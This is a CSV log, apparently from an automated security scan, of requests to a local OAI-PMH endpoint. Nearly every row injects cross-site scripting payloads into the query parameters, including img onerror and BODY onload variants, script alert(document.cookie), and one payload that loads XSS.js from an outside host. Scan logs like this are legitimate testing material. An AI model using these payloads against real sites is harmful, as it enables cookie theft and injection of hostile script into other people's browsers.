uuid,timestamp,http_status_code,request_url,response_time,http_version
ab97c5dd-8343-488a-9d95-e2560df2382e,2024-12-31 05:29:13,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%22-prompt%288%29-%22&until=%22-prompt%288%29-%22&set=%22-prompt%288%29-%22,2056.55 ms,HTTP/1.1
7f0d71a6-9970-499f-be34-172fb75803bc,2024-12-31 05:29:17,403,http://localhost:8081/oai/request?verb=%22%2F%3E%3C%2Fa%3E%3C%2F%3E%3Cimg+src%3D1.gif+onerror%3Dalert%281%29%3E,2042.83 ms,HTTP/1.1
0cf0c65a-c38a-4147-af10-11a4a0e55be0,2024-12-31 05:29:19,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%22%2F%3E%3C%2Fa%3E%3C%2F%3E%3Cimg+src%3D1.gif+onerror%3Dalert%281%29%3E,2065.00 ms,HTTP/1.1
8fab214e-46ae-4ef8-8532-b67b4804037e,2024-12-31 05:29:22,200,http://localhost:8081/oai/request?verb=ListSets,2065.55 ms,HTTP/1.1
b6d94856-1ea5-43c5-ac2a-0858204b37a8,2024-12-31 05:29:24,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%22%2F%3E%3C%2Fa%3E%3C%2F%3E%3Cimg+src%3D1.gif+onerror%3Dalert%281%29%3E,2053.15 ms,HTTP/1.1
43e8b4f2-407d-4ff7-bebc-11c909b684e0,2024-12-31 05:29:27,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc,2467.04 ms,HTTP/1.1
9da07f46-cd07-4749-b239-374f72b25faa,2024-12-31 05:29:29,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%22%2F%3E%3C%2Fa%3E%3C%2F%3E%3Cimg+src%3D1.gif+onerror%3Dalert%281%29%3E&metadataPrefix=oai_dc,2147.99 ms,HTTP/1.1
50f0f14a-5a0a-48de-9b9c-44e8c3d149c2,2024-12-31 05:29:31,403,http://localhost:8081/oai/request?verb=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx09javascript%3Aalert%281%29%5Cx09src%3Dxxx%3Ax+%2F%3E,2044.15 ms,HTTP/1.1
dd085c8a-b7d1-4422-8340-6790158d8cdc,2024-12-31 05:29:33,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx09javascript%3Aalert%281%29%5Cx09src%3Dxxx%3Ax+%2F%3E,2087.73 ms,HTTP/1.1
5d8773df-4260-4547-a5b4-4bbbc3cda27d,2024-12-31 05:29:36,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx09javascript%3Aalert%281%29%5Cx09src%3Dxxx%3Ax+%2F%3E,2050.86 ms,HTTP/1.1
3238e2cb-39ad-46b9-b4e4-a3b916575d65,2024-12-31 05:29:38,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx09javascript%3Aalert%281%29%5Cx09src%3Dxxx%3Ax+%2F%3E&set=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx09javascript%3Aalert%281%29%5Cx09src%3Dxxx%3Ax+%2F%3E,2083.66 ms,HTTP/1.1
fea22aea-28b7-4d26-9857-9aefc21ec05e,2024-12-31 05:29:40,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx09javascript%3Aalert%281%29%5Cx09src%3Dxxx%3Ax+%2F%3E,2087.57 ms,HTTP/1.1
cdbcc7e8-f301-4a0f-8b46-e3bc4f8b0353,2024-12-31 05:29:43,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx09javascript%3Aalert%281%29%5Cx09src%3Dxxx%3Ax+%2F%3E&metadataPrefix=marc,2079.07 ms,HTTP/1.1
9dfb4796-1d5d-4a2d-8886-7fa53d0d7245,2024-12-31 05:29:45,403,http://localhost:8081/oai/request?verb=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx0Ajavascript%3Aalert%281%29%5Cx0Asrc%3Dxxx%3Ax+%2F%3E,2063.47 ms,HTTP/1.1
2a425d0a-862f-41de-b0bf-a7c29c59968d,2024-12-31 05:29:47,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx0Ajavascript%3Aalert%281%29%5Cx0Asrc%3Dxxx%3Ax+%2F%3E,2101.51 ms,HTTP/1.1
3f7e548a-1fc5-4b70-b5bf-3f317938e6f6,2024-12-31 05:29:49,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx0Ajavascript%3Aalert%281%29%5Cx0Asrc%3Dxxx%3Ax+%2F%3E,2034.96 ms,HTTP/1.1
eaf83d4f-cbd9-4d16-b552-c0e3c84016e6,2024-12-31 05:29:52,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx0Ajavascript%3Aalert%281%29%5Cx0Asrc%3Dxxx%3Ax+%2F%3E,2100.21 ms,HTTP/1.1
d223f630-d87e-4bd5-afde-208256f0b158,2024-12-31 05:29:54,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc,2049.28 ms,HTTP/1.1
442c95f3-da3a-4e9f-837c-c82c955efa48,2024-12-31 05:29:56,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx0Ajavascript%3Aalert%281%29%5Cx0Asrc%3Dxxx%3Ax+%2F%3E&metadataPrefix=marc,2050.90 ms,HTTP/1.1
93b84fb3-c286-4a68-8d1d-2207975a8442,2024-12-31 05:29:58,403,http://localhost:8081/oai/request?verb=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx0Bjavascript%3Aalert%281%29%5Cx0Bsrc%3Dxxx%3Ax+%2F%3E,2070.14 ms,HTTP/1.1
eb64f25a-8800-409b-bd44-e0a9d4de926a,2024-12-31 05:30:01,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2115.31 ms,HTTP/1.1
c0fc6bf3-3014-46ac-8754-d957bd50c1b5,2024-12-31 05:30:03,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx0Bjavascript%3Aalert%281%29%5Cx0Bsrc%3Dxxx%3Ax+%2F%3E,2098.88 ms,HTTP/1.1
751f6cd1-46c5-4fbe-ac50-713ec30fa89c,2024-12-31 05:30:05,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx0Bjavascript%3Aalert%281%29%5Cx0Bsrc%3Dxxx%3Ax+%2F%3E&set=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx0Bjavascript%3Aalert%281%29%5Cx0Bsrc%3Dxxx%3Ax+%2F%3E,2088.88 ms,HTTP/1.1
dd19c655-7d86-4a1f-8c50-1905b21c6d72,2024-12-31 05:30:08,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc,2493.81 ms,HTTP/1.1
b4775d16-9064-4171-9a78-7b8469653fd4,2024-12-31 05:30:10,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx0Bjavascript%3Aalert%281%29%5Cx0Bsrc%3Dxxx%3Ax+%2F%3E&metadataPrefix=marc,2083.76 ms,HTTP/1.1
f0ba6e93-b5c8-4efe-8465-7c345b590ece,2024-12-31 05:30:12,403,http://localhost:8081/oai/request?verb=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx0Cjavascript%3Aalert%281%29%5Cx0Csrc%3Dxxx%3Ax+%2F%3E,2052.33 ms,HTTP/1.1
fa041f0f-f8bc-4234-af34-ec9778f05bad,2024-12-31 05:30:15,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx0Cjavascript%3Aalert%281%29%5Cx0Csrc%3Dxxx%3Ax+%2F%3E,2067.87 ms,HTTP/1.1
e1691e6c-a28c-4186-b3e0-112b26634006,2024-12-31 05:30:17,200,http://localhost:8081/oai/request?verb=ListSets,2068.29 ms,HTTP/1.1
563de107-930c-4e6b-bd24-a46eb08a5f6f,2024-12-31 05:30:19,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx0Cjavascript%3Aalert%281%29%5Cx0Csrc%3Dxxx%3Ax+%2F%3E&until=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx0Cjavascript%3Aalert%281%29%5Cx0Csrc%3Dxxx%3Ax+%2F%3E,2060.80 ms,HTTP/1.1
9caa76b7-2575-47fb-a874-d3c5cb943bba,2024-12-31 05:30:22,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx0Cjavascript%3Aalert%281%29%5Cx0Csrc%3Dxxx%3Ax+%2F%3E&set=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx0Cjavascript%3Aalert%281%29%5Cx0Csrc%3Dxxx%3Ax+%2F%3E,2070.09 ms,HTTP/1.1
eca4212c-fdf1-41dc-b556-e4ba0f297a49,2024-12-31 05:30:24,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx0Cjavascript%3Aalert%281%29%5Cx0Csrc%3Dxxx%3Ax+%2F%3E&metadataPrefix=marc,2041.87 ms,HTTP/1.1
66a7d8ff-204e-488e-a558-59bc8366c77e,2024-12-31 05:30:26,403,http://localhost:8081/oai/request?verb=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx0Djavascript%3Aalert%281%29%5Cx0Dsrc%3Dxxx%3Ax+%2F%3E,2047.76 ms,HTTP/1.1
82ba04ea-3ace-4364-9fb3-850675ff9a21,2024-12-31 05:30:28,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx0Djavascript%3Aalert%281%29%5Cx0Dsrc%3Dxxx%3Ax+%2F%3E,2068.70 ms,HTTP/1.1
f10ad345-b99f-4a38-a03b-6bf7d80c6185,2024-12-31 05:30:31,200,http://localhost:8081/oai/request?verb=ListSets,2076.57 ms,HTTP/1.1
2c48fc02-95fa-40d2-92cd-c8b4760f345f,2024-12-31 05:30:33,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx0Djavascript%3Aalert%281%29%5Cx0Dsrc%3Dxxx%3Ax+%2F%3E&set=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx0Djavascript%3Aalert%281%29%5Cx0Dsrc%3Dxxx%3Ax+%2F%3E,2052.78 ms,HTTP/1.1
cdb46294-c2a8-4bcd-a8bb-345af191a4ae,2024-12-31 05:30:35,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx0Djavascript%3Aalert%281%29%5Cx0Dsrc%3Dxxx%3Ax+%2F%3E&until=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx0Djavascript%3Aalert%281%29%5Cx0Dsrc%3Dxxx%3Ax+%2F%3E,2099.97 ms,HTTP/1.1
b3c74559-d060-4739-864f-993c6aacd32f,2024-12-31 05:30:38,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx0Djavascript%3Aalert%281%29%5Cx0Dsrc%3Dxxx%3Ax+%2F%3E&metadataPrefix=oai_dc,2115.62 ms,HTTP/1.1
600a881a-ab62-4a64-9e0a-f39a78a9e95c,2024-12-31 05:30:40,403,http://localhost:8081/oai/request?verb=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx20javascript%3Aalert%281%29%5Cx20src%3Dxxx%3Ax+%2F%3E,2051.11 ms,HTTP/1.1
a7e1ab9d-d35d-4013-860e-f691c5567512,2024-12-31 05:30:42,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2049.87 ms,HTTP/1.1
84eef898-50c4-4ed1-b122-3d0adafc9bad,2024-12-31 05:30:44,200,http://localhost:8081/oai/request?verb=ListSets,2032.79 ms,HTTP/1.1
949531b2-0099-4f15-bf37-f982c8af6669,2024-12-31 05:30:47,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx20javascript%3Aalert%281%29%5Cx20src%3Dxxx%3Ax+%2F%3E&until=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx20javascript%3Aalert%281%29%5Cx20src%3Dxxx%3Ax+%2F%3E&set=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx20javascript%3Aalert%281%29%5Cx20src%3Dxxx%3Ax+%2F%3E,2088.25 ms,HTTP/1.1
44034f35-132a-4deb-a020-83848ef57c68,2024-12-31 05:30:49,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx20javascript%3Aalert%281%29%5Cx20src%3Dxxx%3Ax+%2F%3E&until=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx20javascript%3Aalert%281%29%5Cx20src%3Dxxx%3Ax+%2F%3E&set=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx20javascript%3Aalert%281%29%5Cx20src%3Dxxx%3Ax+%2F%3E,2071.58 ms,HTTP/1.1
315fde6c-6a74-49de-8351-27010d73e173,2024-12-31 05:30:51,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx20javascript%3Aalert%281%29%5Cx20src%3Dxxx%3Ax+%2F%3E&metadataPrefix=oai_dc,2108.63 ms,HTTP/1.1
d77f6967-2d1b-421c-bb80-35d8b93d90f0,2024-12-31 05:30:53,403,http://localhost:8081/oai/request?verb=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx22javascript%3Aalert%281%29%5Cx22src%3Dxxx%3Ax+%2F%3E,2022.73 ms,HTTP/1.1
3f8a409e-4d85-4191-ab09-29835478772e,2024-12-31 05:30:56,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx22javascript%3Aalert%281%29%5Cx22src%3Dxxx%3Ax+%2F%3E,2065.75 ms,HTTP/1.1
339c7470-cfe8-4bda-814d-11181b7f42f9,2024-12-31 05:30:58,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx22javascript%3Aalert%281%29%5Cx22src%3Dxxx%3Ax+%2F%3E,2062.77 ms,HTTP/1.1
86b0bd93-ddf3-4bb9-b2de-10b17c40937c,2024-12-31 05:31:00,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx22javascript%3Aalert%281%29%5Cx22src%3Dxxx%3Ax+%2F%3E&set=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx22javascript%3Aalert%281%29%5Cx22src%3Dxxx%3Ax+%2F%3E,2103.48 ms,HTTP/1.1
e447ed48-c5a0-429f-89dd-101abbcb196e,2024-12-31 05:31:03,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx22javascript%3Aalert%281%29%5Cx22src%3Dxxx%3Ax+%2F%3E,2053.35 ms,HTTP/1.1
0ddd8101-c547-49ab-b1fc-19c615558c9e,2024-12-31 05:31:05,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx22javascript%3Aalert%281%29%5Cx22src%3Dxxx%3Ax+%2F%3E&metadataPrefix=oai_dc,2077.35 ms,HTTP/1.1
0a2b85da-15aa-443e-b0d9-851dd6d8667b,2024-12-31 05:31:07,403,http://localhost:8081/oai/request?verb=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx27javascript%3Aalert%281%29%5Cx27src%3Dxxx%3Ax+%2F%3E,2028.90 ms,HTTP/1.1
dcdad8f6-a55f-4533-b7cd-805f4285473c,2024-12-31 05:31:09,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx27javascript%3Aalert%281%29%5Cx27src%3Dxxx%3Ax+%2F%3E,2065.71 ms,HTTP/1.1
e6ce0560-c5a7-46bc-8f78-f9ccd45c4c82,2024-12-31 05:31:12,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx27javascript%3Aalert%281%29%5Cx27src%3Dxxx%3Ax+%2F%3E,2057.66 ms,HTTP/1.1
ad169e54-00bf-4af2-86a2-c17516cb1a1a,2024-12-31 05:31:14,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx27javascript%3Aalert%281%29%5Cx27src%3Dxxx%3Ax+%2F%3E&set=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx27javascript%3Aalert%281%29%5Cx27src%3Dxxx%3Ax+%2F%3E,2087.12 ms,HTTP/1.1
f79c9ad5-e3c2-463f-ab6f-a5d1ec05e6b3,2024-12-31 05:31:16,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&until=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx27javascript%3Aalert%281%29%5Cx27src%3Dxxx%3Ax+%2F%3E&set=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx27javascript%3Aalert%281%29%5Cx27src%3Dxxx%3Ax+%2F%3E,2062.41 ms,HTTP/1.1
66f2e4c9-1481-4f36-81af-ad55f0e8325a,2024-12-31 05:31:19,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx27javascript%3Aalert%281%29%5Cx27src%3Dxxx%3Ax+%2F%3E&metadataPrefix=oai_dc,2118.66 ms,HTTP/1.1
b6b57660-9d62-47ca-a733-f3fda73c545f,2024-12-31 05:31:21,403,http://localhost:8081/oai/request?verb=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx60javascript%3Aalert%281%29%5Cx60src%3Dxxx%3Ax+%2F%3E,2057.93 ms,HTTP/1.1
8b979547-0378-4bad-9acd-4ecd02dad314,2024-12-31 05:31:23,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2089.57 ms,HTTP/1.1
a2196669-bad2-4adf-a5b8-2eecc269c45a,2024-12-31 05:31:25,200,http://localhost:8081/oai/request?verb=ListSets,2064.07 ms,HTTP/1.1
ffc61449-1ea8-4d33-9ec1-8b13ceeb5be7,2024-12-31 05:31:28,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx60javascript%3Aalert%281%29%5Cx60src%3Dxxx%3Ax+%2F%3E&set=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx60javascript%3Aalert%281%29%5Cx60src%3Dxxx%3Ax+%2F%3E,2025.32 ms,HTTP/1.1
26e45c26-bbd9-4037-bf7f-155aa799cc50,2024-12-31 05:31:30,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx60javascript%3Aalert%281%29%5Cx60src%3Dxxx%3Ax+%2F%3E,2076.11 ms,HTTP/1.1
e00ff36c-f56b-4e8c-99e7-bb9d19e5d234,2024-12-31 05:31:32,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%22%2F%3E%3Cimg%2Fonerror%3D%5Cx60javascript%3Aalert%281%29%5Cx60src%3Dxxx%3Ax+%2F%3E&metadataPrefix=marc,2045.27 ms,HTTP/1.1
78970db8-200c-45b8-9bb3-a4967b7a20ba,2024-12-31 05:31:34,403,http://localhost:8081/oai/request?verb=%22%3B%3E%3B%3C%3BBODY+onload%21%23%24%25%26%3B%28%29%2A~%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22%3BXSS%22%3B%29%3E%3B,2059.11 ms,HTTP/1.1
42397ce8-65cc-4fa7-b57a-3bb7fe071b15,2024-12-31 05:31:37,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%22%3B%3E%3B%3C%3BBODY+onload%21%23%24%25%26%3B%28%29%2A~%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22%3BXSS%22%3B%29%3E%3B,2070.49 ms,HTTP/1.1
bb4156a7-ac98-4cce-8feb-4d99caee53a6,2024-12-31 05:31:39,200,http://localhost:8081/oai/request?verb=ListSets,2061.27 ms,HTTP/1.1
9265e125-4c10-4cb6-9fa6-7d55b741c680,2024-12-31 05:31:41,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%22%3B%3E%3B%3C%3BBODY+onload%21%23%24%25%26%3B%28%29%2A~%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22%3BXSS%22%3B%29%3E%3B&until=%22%3B%3E%3B%3C%3BBODY+onload%21%23%24%25%26%3B%28%29%2A~%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22%3BXSS%22%3B%29%3E%3B&set=%22%3B%3E%3B%3C%3BBODY+onload%21%23%24%25%26%3B%28%29%2A~%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22%3BXSS%22%3B%29%3E%3B,2063.61 ms,HTTP/1.1
3743aba6-b50b-4f32-801e-14cf8176bf3d,2024-12-31 05:31:43,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&set=%22%3B%3E%3B%3C%3BBODY+onload%21%23%24%25%26%3B%28%29%2A~%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22%3BXSS%22%3B%29%3E%3B,2035.85 ms,HTTP/1.1
00f525f7-0137-4522-80dd-74a6cb002697,2024-12-31 05:31:46,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%22%3B%3E%3B%3C%3BBODY+onload%21%23%24%25%26%3B%28%29%2A~%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22%3BXSS%22%3B%29%3E%3B&metadataPrefix=marc,2058.21 ms,HTTP/1.1
6f2eacf7-b034-4c05-9fbd-21a0b286433b,2024-12-31 05:31:48,403,http://localhost:8081/oai/request?verb=%22%3Ba%3Dprompt%2Ca%28%29%2F%2F,2074.99 ms,HTTP/1.1
83de2e7a-54c6-4972-8968-b48075b2d6ab,2024-12-31 05:31:50,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2040.56 ms,HTTP/1.1
1fd75ef8-76bc-4a00-bb51-5f930eedbaf4,2024-12-31 05:31:52,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%22%3Ba%3Dprompt%2Ca%28%29%2F%2F,2103.99 ms,HTTP/1.1
6c1c9e02-25d6-4333-b2ce-8f3c5ae9ed6f,2024-12-31 05:31:55,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%22%3Ba%3Dprompt%2Ca%28%29%2F%2F&set=%22%3Ba%3Dprompt%2Ca%28%29%2F%2F,2077.81 ms,HTTP/1.1
5b3efc45-0aff-4609-9297-f7ec06780242,2024-12-31 05:31:57,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%22%3Ba%3Dprompt%2Ca%28%29%2F%2F,2062.31 ms,HTTP/1.1
89032c1c-7678-44c3-9c5d-32c822048743,2024-12-31 05:31:59,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%22%3Ba%3Dprompt%2Ca%28%29%2F%2F&metadataPrefix=oai_dc,2126.98 ms,HTTP/1.1
392bd8ee-74dd-4ff5-9d9c-99b4438cd092,2024-12-31 05:32:02,403,http://localhost:8081/oai/request?verb=%22%3E%2FKinG-InFeT.NeT%2F%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E,2078.44 ms,HTTP/1.1
6c00be2d-95f4-410e-b50d-8740de53fa1d,2024-12-31 05:32:04,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2061.46 ms,HTTP/1.1
c2ce9ce8-74bc-4408-b048-8ecaba8357ae,2024-12-31 05:32:06,200,http://localhost:8081/oai/request?verb=ListSets,2062.72 ms,HTTP/1.1
1a216a94-aebc-4cc1-814b-d7495be769a7,2024-12-31 05:32:09,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,2297.45 ms,HTTP/1.1
530dcb9f-cc35-43be-917e-37b6cf9309f6,2024-12-31 05:32:11,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%22%3E%2FKinG-InFeT.NeT%2F%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&set=%22%3E%2FKinG-InFeT.NeT%2F%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E,2041.36 ms,HTTP/1.1
c3ae9a79-2fee-441f-8b26-63eea14e13e7,2024-12-31 05:32:13,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%22%3E%2FKinG-InFeT.NeT%2F%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&metadataPrefix=marc,2042.69 ms,HTTP/1.1
50a31151-84f6-4afd-89af-6536df4024d1,2024-12-31 05:32:15,403,http://localhost:8081/oai/request?verb=%22%3E%2FXaDoS%2F%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E%3Cscript+src%3D%22http%3A%2F%2Fwww.site.com%2FXSS.js%22%3E%3C%2Fscript%3E,2032.53 ms,HTTP/1.1
627e814c-ba40-4fac-9edd-271c359eb36d,2024-12-31 05:32:18,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%22%3E%2FXaDoS%2F%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E%3Cscript+src%3D%22http%3A%2F%2Fwww.site.com%2FXSS.js%22%3E%3C%2Fscript%3E,2037.36 ms,HTTP/1.1
05433f5a-32d7-4ee7-94fd-1828a3925ff8,2024-12-31 05:32:20,200,http://localhost:8081/oai/request?verb=ListSets,2093.93 ms,HTTP/1.1
3ce35032-b00c-4b21-80b3-c618fcac45c9,2024-12-31 05:32:22,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%22%3E%2FXaDoS%2F%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E%3Cscript+src%3D%22http%3A%2F%2Fwww.site.com%2FXSS.js%22%3E%3C%2Fscript%3E,2089.60 ms,HTTP/1.1
57ae0129-b8f8-4da7-8c35-0c6ca2f0e160,2024-12-31 05:32:24,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc,2066.72 ms,HTTP/1.1
fb6f0a38-293b-40e6-8481-41ba3fb3313a,2024-12-31 05:32:27,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%22%3E%2FXaDoS%2F%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E%3Cscript+src%3D%22http%3A%2F%2Fwww.site.com%2FXSS.js%22%3E%3C%2Fscript%3E&metadataPrefix=oai_dc,2135.80 ms,HTTP/1.1
